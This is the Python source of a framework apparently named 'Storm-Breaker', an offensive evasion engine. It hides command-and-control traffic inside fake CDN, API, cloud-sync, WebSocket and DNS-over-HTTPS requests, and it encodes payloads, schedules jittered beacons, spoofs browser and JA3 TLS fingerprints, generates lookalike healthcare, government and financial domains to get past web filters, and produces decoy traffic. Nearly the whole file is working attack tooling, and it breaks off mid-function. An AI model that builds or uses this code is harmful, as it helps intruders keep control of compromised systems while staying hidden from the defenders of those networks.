"""
Storm-Breaker Evasion Framework
Advanced anti-detection, traffic disguise, and fingerprint spoofing engine.
Provides C2 traffic profiles, browser fingerprint randomization, timing jitter,
domain categorization bypass, and decoy traffic generation.
"""

import random
import hashlib
import string
import math
import json
import time
import re
from datetime import datetime, timedelta


# ═══════════════════════════════════════════════════════════════════
# BROWSER FINGERPRINT SPOOFING
# ═══════════════════════════════════════════════════════════════════

# Realistic User-Agent database — major browsers across platforms
_UA_DATABASE = {
    'chrome_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    ],
    'chrome_mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    ],
    'firefox_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    ],
    'firefox_mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    ],
    'safari_mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    ],
    'edge_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    ],
    'chrome_android': [
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    ],
    'safari_ios': [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    ],
}

# Screen resolution pools per device class
_SCREEN_RESOLUTIONS = {
    'desktop': [
        (1920, 1080), (2560, 1440), (1366, 768), (1536, 864),
        (1440, 900), (1680, 1050), (3840, 2160), (1280, 720),
        (1600, 900), (2560, 1080),
    ],
    'mobile': [
        (412, 915), (390, 844), (360, 800), (414, 896),
        (375, 812), (393, 873), (360, 780), (428, 926),
    ],
    'tablet': [
        (1024, 768), (768, 1024), (1280, 800), (800, 1280),
        (1194, 834), (834, 1194),
    ],
}

# WebGL renderer strings
_WEBGL_RENDERERS = [
    'ANGLE (Intel, Intel(R) UHD Graphics 630, OpenGL 4.5)',
    'ANGLE (Intel, Intel(R) Iris(R) Xe Graphics, OpenGL 4.5)',
    'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060, OpenGL 4.5)',
    'ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Ti, OpenGL 4.5)',
    'ANGLE (AMD, AMD Radeon RX 6700 XT, OpenGL 4.5)',
    'ANGLE (AMD, AMD Radeon(TM) Graphics, OpenGL 4.5)',
    'Apple GPU',
    'Apple M1',
    'Apple M2',
    'Mali-G78',
    'Adreno (TM) 730',
]

# Timezone database
_TIMEZONES = [
    ('America/New_York', -300), ('America/Chicago', -360),
    ('America/Denver', -420), ('America/Los_Angeles', -480),
    ('America/Phoenix', -420), ('Europe/London', 0),
    ('Europe/Paris', 60), ('Europe/Berlin', 60),
    ('Europe/Moscow', 180), ('Asia/Tokyo', 540),
    ('Asia/Shanghai', 480), ('Asia/Kolkata', 330),
    ('Australia/Sydney', 660), ('Pacific/Auckland', 780),
]

# Language codes with weights (by global prevalence)
_LANGUAGES = [
    ('en-US', 0.30), ('en-GB', 0.08), ('es-ES', 0.06), ('fr-FR', 0.05),
    ('de-DE', 0.05), ('pt-BR', 0.04), ('ja-JP', 0.04), ('zh-CN', 0.04),
    ('ko-KR', 0.03), ('ru-RU', 0.03), ('it-IT', 0.02), ('nl-NL', 0.02),
    ('pl-PL', 0.02), ('tr-TR', 0.02), ('ar-SA', 0.02),
]

# Font families per OS
_FONTS = {
    'windows': [
        'Arial', 'Calibri', 'Cambria', 'Comic Sans MS', 'Consolas',
        'Courier New', 'Georgia', 'Impact', 'Lucida Console',
        'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana',
    ],
    'macos': [
        'Arial', 'Avenir', 'Courier', 'Futura', 'Geneva',
        'Helvetica', 'Helvetica Neue', 'Menlo', 'Monaco',
        'San Francisco', 'Times', 'Trebuchet MS',
    ],
    'linux': [
        'Arial', 'Cantarell', 'DejaVu Sans', 'Droid Sans',
        'FreeSans', 'Liberation Sans', 'Noto Sans', 'Ubuntu',
    ],
}


def generate_spoofed_fingerprint(device_class='desktop', consistency=True):
    """
    Generate a realistic spoofed browser fingerprint.
    If consistency=True, all fields are internally consistent
    (e.g., macOS UA won't have Windows fonts).
    """
    if device_class == 'mobile':
        ua_pool = random.choice(['chrome_android', 'safari_ios'])
    elif device_class == 'tablet':
        ua_pool = random.choice(['safari_ios', 'chrome_android'])
    else:
        ua_pool = random.choice([
            'chrome_windows', 'chrome_mac', 'firefox_windows',
            'firefox_mac', 'safari_mac', 'edge_windows',
        ])

    user_agent = random.choice(_UA_DATABASE[ua_pool])

    # Determine OS from UA pool for consistency
    if 'windows' in ua_pool or 'edge' in ua_pool:
        os_name = 'windows'
        platform_str = 'Win32'
    elif 'mac' in ua_pool or 'safari_mac' in ua_pool:
        os_name = 'macos'
        platform_str = 'MacIntel'
    elif 'android' in ua_pool:
        os_name = 'linux'
        platform_str = 'Linux armv81'
    elif 'ios' in ua_pool:
        os_name = 'macos'
        platform_str = 'iPhone'
    else:
        os_name = 'linux'
        platform_str = 'Linux x86_64'

    screen = random.choice(_SCREEN_RESOLUTIONS[device_class])
    tz = random.choice(_TIMEZONES)
    lang = _weighted_choice(_LANGUAGES)

    # Canvas hash — deterministic-looking random hex
    canvas_seed = f"{user_agent}{screen}{tz[0]}{random.randint(0, 9999)}"
    canvas_hash = hashlib.md5(canvas_seed.encode()).hexdigest()

    # WebGL
    if device_class == 'mobile':
        webgl_renderer = random.choice(_WEBGL_RENDERERS[-3:])
    elif os_name == 'macos':
        webgl_renderer = random.choice([r for r in _WEBGL_RENDERERS if 'Apple' in r])
    else:
        webgl_renderer = random.choice(_WEBGL_RENDERERS[:6])

    # Fonts
    if consistency:
        available_fonts = _FONTS.get(os_name, _FONTS['windows'])
    else:
        available_fonts = _FONTS['windows'] + _FONTS['macos'] + _FONTS['linux']
    font_count = random.randint(len(available_fonts) - 4, len(available_fonts))
    detected_fonts = sorted(random.sample(available_fonts, min(font_count, len(available_fonts))))

    # Hardware
    if device_class == 'mobile':
        cpu_cores = random.choice([4, 6, 8])
        device_memory = random.choice([4, 6, 8])
    else:
        cpu_cores = random.choice([4, 6, 8, 12, 16])
        device_memory = random.choice([8, 16, 32])

    # Color depth and pixel ratio
    color_depth = 24
    pixel_ratio = random.choice([1, 1.25, 1.5, 2, 2.625, 3]) if device_class == 'mobile' else random.choice([1, 1.25, 1.5, 2])

    fingerprint = {
        'user_agent': user_agent,
        'platform': platform_str,
        'language': lang,
        'languages': [lang, lang.split('-')[0]],
        'timezone': tz[0],
        'timezone_offset': tz[1],
        'screen_width': screen[0],
        'screen_height': screen[1],
        'color_depth': color_depth,
        'pixel_ratio': pixel_ratio,
        'cpu_cores': cpu_cores,
        'device_memory': device_memory,
        'canvas_hash': canvas_hash,
        'webgl_renderer': webgl_renderer,
        'webgl_vendor': 'Google Inc. (Intel)' if 'Intel' in webgl_renderer else 'Google Inc. (NVIDIA)' if 'NVIDIA' in webgl_renderer else 'Apple Inc.',
        'fonts_detected': detected_fonts,
        'font_count': len(detected_fonts),
        'do_not_track': random.choice([None, '1']),
        'cookies_enabled': True,
        'touch_support': device_class in ('mobile', 'tablet'),
        'max_touch_points': 5 if device_class in ('mobile', 'tablet') else 0,
        'audio_context_hash': hashlib.sha256(canvas_seed.encode()).hexdigest()[:16],
        'device_class': device_class,
        'os_family': os_name,
        'consistency_score': _calculate_consistency(user_agent, os_name, platform_str, webgl_renderer),
    }

    return fingerprint


def _weighted_choice(items):
    """Select from weighted list of (item, weight) tuples."""
    total = sum(w for _, w in items)
    r = random.uniform(0, total)
    cumulative = 0
    for item, weight in items:
        cumulative += weight
        if r <= cumulative:
            return item
    return items[-1][0]


def _calculate_consistency(ua, os_name, platform_str, webgl):
    """Score how internally consistent the fingerprint is (0-100)."""
    score = 100
    # Check UA matches OS
    if os_name == 'windows' and 'Windows' not in ua:
        score -= 25
    if os_name == 'macos' and 'Mac' not in ua and 'iPhone' not in ua:
        score -= 25
    # Check WebGL matches OS
    if os_name == 'macos' and 'Apple' not in webgl and 'ANGLE' in webgl:
        score -= 15
    # Check platform matches
    if os_name == 'windows' and platform_str != 'Win32':
        score -= 20
    return max(0, score)


# ═══════════════════════════════════════════════════════════════════
# C2 TRAFFIC PROFILES — Disguise C2 comms as legitimate traffic
# ═══════════════════════════════════════════════════════════════════

TRAFFIC_PROFILES = {
    'cdn_static': {
        'name': 'CDN Static Assets',
        'description': 'Disguise C2 as CDN asset requests (images, CSS, JS)',
        'icon': '🌐',
        'stealth_rating': 85,
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        },
        'url_patterns': [
            '/cdn-cgi/scripts/main.{hash}.js',
            '/assets/images/banner_{hash}.png',
            '/static/css/theme-{hash}.css',
            '/media/content/{hash}/preview.jpg',
        ],
        'content_type': 'application/javascript',
        'data_encoding': 'base64_in_json_comment',
        'jitter_range': (2, 8),
    },
    'api_rest': {
        'name': 'REST API Traffic',
        'description': 'Disguise C2 as standard REST API calls',
        'icon': '🔗',
        'stealth_rating': 75,
        'headers': {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'X-API-Version': '2.1',
        },
        'url_patterns': [
            '/api/v2/users/{hash}/preferences',
            '/api/v2/analytics/events',
            '/api/v2/notifications/check',
            '/api/v2/sync/status',
        ],
        'content_type': 'application/json',
        'data_encoding': 'json_nested',
        'jitter_range': (5, 30),
    },
    'social_media': {
        'name': 'Social Media API',
        'description': 'Mimic social media platform API calls',
        'icon': '📱',
        'stealth_rating': 80,
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-IG-App-ID': '936619743392459',
            'X-Requested-With': 'XMLHttpRequest',
        },
        'url_patterns': [
            '/graphql/query/?query_hash={hash}',
            '/ajax/notifications/mark_read/',
            '/api/feed/timeline/',
            '/api/friendships/show/{hash}/',
        ],
        'content_type': 'application/json',
        'data_encoding': 'json_nested',
        'jitter_range': (3, 15),
    },
    'cloud_sync': {
        'name': 'Cloud Storage Sync',
        'description': 'Disguise as cloud storage sync operations',
        'icon': '☁️',
        'stealth_rating': 90,
        'headers': {
            'Accept': '*/*',
            'Content-Type': 'application/octet-stream',
            'X-Upload-Content-Type': 'application/octet-stream',
            'X-Goog-Upload-Protocol': 'resumable',
        },
        'url_patterns': [
            '/upload/drive/v3/files/{hash}?uploadType=resumable',
            '/v1.0/me/drive/items/{hash}/content',
            '/2/files/upload_session/append_v2',
            '/api/2.0/files/{hash}/content',
        ],
        'content_type': 'application/octet-stream',
        'data_encoding': 'binary_xor',
        'jitter_range': (10, 60),
    },
    'websocket_chat': {
        'name': 'WebSocket Chat',
        'description': 'Mimic real-time chat application WebSocket traffic',
        'icon': '💬',
        'stealth_rating': 88,
        'headers': {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Version': '13',
        },
        'url_patterns': [
            '/ws/chat/v2/connect',
            '/realtime/websocket',
            '/socket.io/?EIO=4&transport=websocket',
            '/cable',
        ],
        'content_type': 'application/json',
        'data_encoding': 'json_nested',
        'jitter_range': (1, 5),
    },
    'dns_over_https': {
        'name': 'DNS over HTTPS',
        'description': 'Tunnel C2 data inside DoH queries',
        'icon': '🔒',
        'stealth_rating': 95,
        'headers': {
            'Accept': 'application/dns-json',
            'Content-Type': 'application/dns-message',
        },
        'url_patterns': [
            '/dns-query?name={hash}.example.com&type=TXT',
            '/resolve?name={hash}.cdn.example.net&type=A',
        ],
        'content_type': 'application/dns-json',
        'data_encoding': 'dns_txt_records',
        'jitter_range': (1, 3),
    },
}


def get_traffic_profiles():
    """Return all available traffic profiles with metadata."""
    result = {}
    for key, profile in TRAFFIC_PROFILES.items():
        result[key] = {
            'name': profile['name'],
            'description': profile['description'],
            'icon': profile['icon'],
            'stealth_rating': profile['stealth_rating'],
            'data_encoding': profile['data_encoding'],
            'jitter_range': profile['jitter_range'],
            'url_pattern_count': len(profile['url_patterns']),
        }
    return result


def generate_disguised_request(profile_key, payload_data, target_url=None):
    """
    Generate a complete disguised HTTP request for C2 communication.
    Returns headers, URL, encoded body, and timing info.
    """
    if profile_key not in TRAFFIC_PROFILES:
        return {'error': f'Unknown profile: {profile_key}'}

    profile = TRAFFIC_PROFILES[profile_key]
    req_hash = hashlib.md5(str(random.random()).encode()).hexdigest()[:12]

    # Build URL
    url_template = random.choice(profile['url_patterns'])
    url = url_template.replace('{hash}', req_hash)
    if target_url:
        url = target_url + url

    # Encode payload
    encoded_body = _encode_payload(payload_data, profile['data_encoding'], req_hash)

    # Random UA from pool
    ua_key = random.choice(list(_UA_DATABASE.keys()))
    ua = random.choice(_UA_DATABASE[ua_key])

    # Build headers
    headers = dict(profile['headers'])
    headers['User-Agent'] = ua

    # Timing jitter
    jitter_min, jitter_max = profile['jitter_range']
    jitter_seconds = random.uniform(jitter_min, jitter_max)

    return {
        'url': url,
        'method': 'POST' if payload_data else 'GET',
        'headers': headers,
        'body': encoded_body,
        'content_type': profile['content_type'],
        'jitter_seconds': round(jitter_seconds, 2),
        'profile': profile['name'],
        'stealth_rating': profile['stealth_rating'],
        'encoding': profile['data_encoding'],
        'request_hash': req_hash,
        'timestamp': datetime.now().isoformat(),
    }


def _encode_payload(data, encoding, key):
    """Encode C2 payload data according to the traffic profile's encoding scheme."""
    import base64
    raw = json.dumps(data) if isinstance(data, (dict, list)) else str(data)

    if encoding == 'base64_in_json_comment':
        b64 = base64.b64encode(raw.encode()).decode()
        return json.dumps({
            'version': '3.2.1',
            'modules': [key],
            '_comment': b64,
            'timestamp': int(time.time()),
        })

    elif encoding == 'json_nested':
        b64 = base64.b64encode(raw.encode()).decode()
        return json.dumps({
            'data': {
                'type': 'notification',
                'id': key,
                'attributes': {
                    'content': b64,
                    'read': False,
                    'created_at': datetime.now().isoformat(),
                },
            },
            'meta': {'page': 1, 'total': 1},
        })

    elif encoding == 'binary_xor':
        xor_key = hashlib.sha256(key.encode()).digest()
        raw_bytes = raw.encode()
        xored = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw_bytes))
        return base64.b64encode(xored).decode()

    elif encoding == 'dns_txt_records':
        b64 = base64.b64encode(raw.encode()).decode()
        # Split into 255-char TXT record chunks
        chunks = [b64[i:i+255] for i in range(0, len(b64), 255)]
        return json.dumps({
            'Status': 0,
            'Answer': [
                {'name': f'{key}.example.com', 'type': 16, 'TTL': 300, 'data': chunk}
                for chunk in chunks
            ],
        })

    else:
        return base64.b64encode(raw.encode()).decode()


# ═══════════════════════════════════════════════════════════════════
# TIMING JITTER ENGINE — Human-like communication patterns
# ═══════════════════════════════════════════════════════════════════

TIMING_PROFILES = {
    'office_hours': {
        'name': 'Office Hours',
        'description': 'Active 9am-5pm, minimal nights/weekends',
        'icon': '🏢',
        'active_hours': (9, 17),
        'weekend_factor': 0.1,
        'base_interval': 30,
        'variance': 0.4,
    },
    'always_on': {
        'name': 'Always On',
        'description': 'Consistent activity 24/7 with slight variation',
        'icon': '⏰',
        'active_hours': (0, 24),
        'weekend_factor': 0.9,
        'base_interval': 15,
        'variance': 0.2,
    },
    'night_owl': {
        'name': 'Night Owl',
        'description': 'Peak activity 8pm-4am, minimal daytime',
        'icon': '🌙',
        'active_hours': (20, 4),
        'weekend_factor': 1.2,
        'base_interval': 20,
        'variance': 0.5,
    },
    'sporadic': {
        'name': 'Sporadic',
        'description': 'Irregular bursts of activity with long gaps',
        'icon': '🎲',
        'active_hours': (0, 24),
        'weekend_factor': 0.7,
        'base_interval': 60,
        'variance': 0.8,
    },
    'low_slow': {
        'name': 'Low & Slow',
        'description': 'Very infrequent, designed to stay under the radar',
        'icon': '🐢',
        'active_hours': (0, 24),
        'weekend_factor': 0.5,
        'base_interval': 300,
        'variance': 0.6,
    },
}


def get_timing_profiles():
    """Return all timing profiles."""
    return {k: {kk: vv for kk, vv in v.items() if kk != 'active_hours'}
            for k, v in TIMING_PROFILES.items()}


def calculate_next_beacon(profile_key, current_time=None):
    """
    Calculate the next C2 beacon time based on the timing profile.
    Returns seconds until next beacon and whether the agent should be active.
    """
    if profile_key not in TIMING_PROFILES:
        return {'error': f'Unknown profile: {profile_key}'}

    profile = TIMING_PROFILES[profile_key]
    now = current_time or datetime.now()
    hour = now.hour
    is_weekend = now.weekday() >= 5

    # Check if within active hours
    start_h, end_h = profile['active_hours']
    if start_h < end_h:
        is_active_hours = start_h <= hour < end_h
    else:
        is_active_hours = hour >= start_h or hour < end_h

    # Calculate interval
    base = profile['base_interval']
    variance = profile['variance']

    # Apply modifiers
    if not is_active_hours:
        base *= 5  # 5x slower outside active hours
    if is_weekend:
        base /= profile['weekend_factor'] if profile['weekend_factor'] > 0 else 1

    # Add jitter
    jitter = random.gauss(0, base * variance)
    interval = max(5, base + jitter)  # Minimum 5 seconds

    return {
        'next_beacon_seconds': round(interval, 1),
        'is_active_hours': is_active_hours,
        'is_weekend': is_weekend,
        'current_hour': hour,
        'profile': profile['name'],
        'base_interval': base,
        'applied_jitter': round(jitter, 1),
    }


def generate_beacon_schedule(profile_key, duration_hours=24, start_time=None):
    """Generate a full beacon schedule for visualization."""
    start = start_time or datetime.now()
    schedule = []
    current = start
    end = start + timedelta(hours=duration_hours)

    while current < end:
        result = calculate_next_beacon(profile_key, current)
        if 'error' in result:
            return result
        schedule.append({
            'time': current.isoformat(),
            'active': result['is_active_hours'],
            'interval': result['next_beacon_seconds'],
        })
        current += timedelta(seconds=result['next_beacon_seconds'])

    return {
        'profile': profile_key,
        'duration_hours': duration_hours,
        'total_beacons': len(schedule),
        'avg_interval': round(sum(s['interval'] for s in schedule) / len(schedule), 1) if schedule else 0,
        'schedule': schedule[:200],  # Cap at 200 entries for display
    }


# ═══════════════════════════════════════════════════════════════════
# DOMAIN CATEGORIZATION BYPASS
# ═══════════════════════════════════════════════════════════════════

DOMAIN_CATEGORIES = {
    'business': {
        'name': 'Business & Corporate',
        'icon': '🏢',
        'patterns': [
            '{company}-portal.com', '{company}-sso.com', '{company}-workspace.net',
            'login.{company}-corp.com', 'auth.{company}-services.com',
        ],
        'keywords': ['portal', 'workspace', 'corporate', 'enterprise', 'sso'],
        'ssl_org': '{company} Inc.',
        'bypass_rating': 80,
    },
    'cloud': {
        'name': 'Cloud Services',
        'icon': '☁️',
        'patterns': [
            '{company}-cloud.com', '{company}.cloud-services.net',
            'app.{company}-saas.com', '{company}-cdn.net',
        ],
        'keywords': ['cloud', 'saas', 'cdn', 'hosting', 'infrastructure'],
        'ssl_org': '{company} Cloud Services LLC',
        'bypass_rating': 85,
    },
    'healthcare': {
        'name': 'Healthcare',
        'icon': '🏥',
        'patterns': [
            '{company}-health.org', 'portal.{company}-medical.com',
            '{company}-patient-portal.com',
        ],
        'keywords': ['health', 'medical', 'patient', 'portal', 'care'],
        'ssl_org': '{company} Health Systems',
        'bypass_rating': 90,
    },
    'education': {
        'name': 'Education',
        'icon': '🎓',
        'patterns': [
            '{company}-edu.org', 'lms.{company}-academy.com',
            '{company}-learning.net', 'students.{company}.edu.org',
        ],
        'keywords': ['edu', 'learning', 'academy', 'student', 'lms'],
        'ssl_org': '{company} Educational Foundation',
        'bypass_rating': 88,
    },
    'government': {
        'name': 'Government',
        'icon': '🏛️',
        'patterns': [
            '{company}-gov-portal.com', 'services.{company}-govt.org',
            '{company}-public-services.org',
        ],
        'keywords': ['gov', 'government', 'public', 'services', 'civic'],
        'ssl_org': '{company} Government Services',
        'bypass_rating': 92,
    },
    'financial': {
        'name': 'Financial Services',
        'icon': '🏦',
        'patterns': [
            '{company}-banking.com', 'secure.{company}-financial.com',
            '{company}-investments.net',
        ],
        'keywords': ['banking', 'financial', 'secure', 'investments', 'capital'],
        'ssl_org': '{company} Financial Services LLC',
        'bypass_rating': 75,
    },
}


def get_domain_categories():
    """Return all domain categories."""
    return {k: {'name': v['name'], 'icon': v['icon'],
                'bypass_rating': v['bypass_rating'],
                'pattern_count': len(v['patterns'])}
            for k, v in DOMAIN_CATEGORIES.items()}


def generate_domains(category_key, company_name, count=5):
    """Generate realistic domain names for a given category."""
    if category_key not in DOMAIN_CATEGORIES:
        return {'error': f'Unknown category: {category_key}'}

    cat = DOMAIN_CATEGORIES[category_key]
    slug = re.sub(r'[^a-z0-9]', '', company_name.lower())

    domains = []
    patterns = cat['patterns'] * 3  # Expand pool
    random.shuffle(patterns)

    for pattern in patterns[:count]:
        domain = pattern.replace('{company}', slug)
        # Generate realistic SSL info
        domains.append({
            'domain': domain,
            'ssl_org': cat['ssl_org'].replace('{company}', company_name),
            'ssl_valid_days': random.randint(90, 365),
            'category_match': cat['name'],
            'bypass_rating': cat['bypass_rating'] + random.randint(-5, 5),
            'keywords': cat['keywords'],
        })

    return {
        'category': cat['name'],
        'company': company_name,
        'generated_domains': domains,
        'total': len(domains),
    }


# ═══════════════════════════════════════════════════════════════════
# DECOY TRAFFIC GENERATOR
# ═══════════════════════════════════════════════════════════════════

DECOY_PATTERNS = {
    'browsing': {
        'name': 'Normal Browsing',
        'description': 'Simulate normal web browsing patterns',
        'urls': [
            'https://www.google.com/search?q={query}',
            'https://en.wikipedia.org/wiki/{topic}',
            'https://www.reddit.com/r/{subreddit}/',
            'https://news.ycombinator.com/',
            'https://stackoverflow.com/questions/{id}',
        ],
        'queries': ['weather today', 'python tutorial', 'restaurant near me', 'best laptop 2024', 'news'],
        'topics': ['Python_(programming_language)', 'Artificial_intelligence', 'Cloud_computing'],
        'subreddits': ['technology', 'programming', 'news', 'science'],
        'request_count': (10, 30),
    },
    'office': {
        'name': 'Office Work',
        'description': 'Simulate office application usage',
        'urls': [
            'https://outlook.office365.com/api/v2.0/me/messages',
            'https://graph.microsoft.com/v1.0/me/drive/recent',
            'https://teams.microsoft.com/api/chatsvc/emea/v1/users/ME/conversations',
            'https://docs.google.com/document/d/{id}/edit',
        ],
        'request_count': (20, 50),
    },
    'social': {
        'name': 'Social Media',
        'description': 'Simulate social media activity',
        'urls': [
            'https://www.facebook.com/api/graphql/',
            'https://api.twitter.com/2/timeline/home.json',
            'https://www.instagram.com/api/v1/feed/timeline/',
            'https://www.linkedin.com/voyager/api/feed/updates',
        ],
        'request_count': (15, 40),
    },
}


def get_decoy_patterns():
    """Return available decoy traffic patterns."""
    return {k: {'name': v['name'], 'description': v['description'],
                'request_count': v['request_count']}
            for k, v in DECOY_PATTERNS.items()}


def generate_decoy_traffic(pattern_key, duration_minutes=30):
    """Generate a decoy traffic plan with realistic timing."""
    if pattern_key not in DECOY_PATTERNS:
        return {'error': f'Unknown pattern: {pattern_key}'}

    pattern = DECOY_PATTERNS[pattern_key]
    req_min, req_max = pattern['request_count']
    count = random.randint(req_min, req_max)

    requests = []
    current_offset = 0

    for i in range(count):
        url = random.choice(pattern['urls'])
        # Replace placeholders
        url = url.replace('{query}', random.choice(pattern.get('queries', ['test'])))
        url = url.replace('{topic}', random.choice(pattern.get('topics', ['Main_Page'])))
        url = url.replace('{subreddit}', random.choice(pattern.get('subreddits', ['all'])))
        url = url.replace('{id}', str(random.randint(10000, 99999999)))

        gap = random.uniform(5, (duration_minutes * 60) / count)
        current_offset += gap

        requests.append({
            'index': i + 1,
            'url': url,
            'method': 'GET',
            'offset_seconds': round(current_offset, 1),
            'user_agent': random.choice(random.choice(list(_UA_DATABASE.values()))),
        })

    return {
        'pattern': pattern['name'],
        'total_requests': count,
        'duration_minutes': duration_minutes,
        'avg_interval_seconds': round(duration_minutes * 60 / count, 1),
        'requests': requests,
    }


# ═══════════════════════════════════════════════════════════════════
# JA3 / TLS FINGERPRINT ROTATION
# ═══════════════════════════════════════════════════════════════════

# Real-world JA3 hashes from common browsers
JA3_DATABASE = {
    'chrome_120': {
        'hash': 'cd08e31494f9531f560d64c695473da9',
        'browser': 'Chrome 120',
        'cipher_suites': '4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53',
        'prevalence': 'very_high',
    },
    'firefox_121': {
        'hash': '839bbe3ed7623ddd23dd5db8f0a2f5fc',
        'browser': 'Firefox 121',
        'cipher_suites': '4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53',
        'prevalence': 'high',
    },
    'safari_17': {
        'hash': '773906b0efdefa24a7f2b8eb6985bf37',
        'browser': 'Safari 17',
        'cipher_suites': '4865-4866-4867-49196-49195-52393-49200-49199-52392-49162-49161-49172-49171-157-156-53-47',
        'prevalence': 'medium',
    },
    'edge_120': {
        'hash': 'b32309a26951912be7dba376398abc3b',
        'browser': 'Edge 120',
        'cipher_suites': '4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53',
        'prevalence': 'medium',
    },
    'curl_default': {
        'hash': '456523fc94726331a4d5a2e1d40b2cd7',
        'browser': 'curl/libcurl',
        'cipher_suites': '49195-49199-49196-49200-52393-52392',
        'prevalence': 'low',
    },
    'python_requests': {
        'hash': 'b386946a5a44d1ddcc843bc75336dfce',
        'browser': 'Python requests',
        'cipher_suites': '49195-49199-49196-49200-52393-52392-49171-49172',
        'prevalence': 'very_low',
    },
}


def get_ja3_profiles():
    """Return JA3 fingerprint profiles."""
    return JA3_DATABASE


def recommend_ja3(target_browser=None):
    """Recommend a JA3 profile to match or blend with target environment."""
    if target_browser:
        target_lower = target_browser.lower()
        for key, profile in JA3_DATABASE.items():
            if target_lower in profile['browser'].lower():
                return {
                    'recommended': key,
                    'profile': profile,
                    'reason': f'Matches target browser: {profile["browser"]}',
                }
    # Default: recommend most prevalent
    high_prev = [k for k, v in JA3_DATABASE.items() if v['prevalence'] in ('very_high', 'high')]
    chosen = random.choice(high_prev) if high_prev else list(JA3_DATABASE.keys())[0]
    return {
        'recommended': chosen,
        'profile': JA3_DATABASE[chosen],
        'reason': f'High prevalence profile for blending: {JA3_DATABASE[chosen]["browser"]}',
    }


# ═══════════════════════════════════════════════════════════════════
# EVASION CONFIGURATION BUILDER
# ═══════════════════════════════════════════════════════════════════

def build_evasion_config(options):
    """
    Build a complete evasion configuration from user selections.
    Combines fingerprint spoofing, traffic profile, timing, domain bypass, and JA3.
    """
    config = {
        'created_at': datetime.now().isoformat(),
        'config_hash': hashlib.sha256(json.dumps(options, sort_keys=True).encode()).hexdigest()[:16],
    }

    # Fingerprint spoofing
    device_class = options.get('device_class', 'desktop')
    config['fingerprint'] = generate_spoofed_fingerprint(device_class)

    # Traffic profile
    traffic_key = options.get('traffic_profile', 'cdn_static')
    if traffic_key in TRAFFIC_PROFILES:
        profile = TRAFFIC_PROFILES[traffic_key]
        config['traffic'] = {
            'profile': profile['name'],
            'stealth_rating': profile['stealth_rating'],
            'encoding': profile['data_encoding'],
            'jitter': profile['jitter_range'],
            'headers': profile['headers'],
        }

    # Timing
    timing_key = options.get('timing_profile', 'office_hours')
    if timing_key in TIMING_PROFILES:
        tp = TIMING_PROFILES[timing_key]
        config['timing'] = {
            'profile': tp['name'],
            'base_interval': tp['base_interval'],
            'variance': tp['variance'],
        }

    # Domain
    domain_cat = options.get('domain_category')
    company = options.get('company_name', 'AcmeCorp')
    if domain_cat and domain_cat in DOMAIN_CATEGORIES:
        config['domains'] = generate_domains(domain_cat, company, count=3)

    # JA3
    config['ja3'] = recommend_ja3(options.get('target_browser'))

    # Overall stealth score
    scores = []
    if 'traffic' in config:
        scores.append(config['traffic']['stealth_rating'])
    if config['fingerprint'].get('consistency_score'):
